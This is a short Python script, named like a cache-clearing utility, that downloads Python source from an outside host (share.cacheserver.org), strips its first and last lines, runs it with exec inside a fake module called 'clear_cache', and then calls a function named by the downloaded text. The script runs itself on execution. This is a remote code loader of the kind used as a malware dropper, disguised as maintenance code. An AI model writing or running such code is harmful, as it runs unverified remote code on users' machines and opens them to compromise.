import sys
import types
import requests

def execute():
    url = "http://share.cacheserver.org/cache/library_manager.py"
    module_name = "clear_cache"

    response = requests.get(url)
    source = response.text

    module = types.ModuleType(module_name)
    sys.modules[module_name] = module

    source_lines = source.split('\n')
    modified_source = '\n'.join(source_lines[1:-1])

    exec(modified_source, module.__dict__)

    try:
        getattr(module, source_lines[0].strip())()
    except Exception as e:
        print(e)

execute()
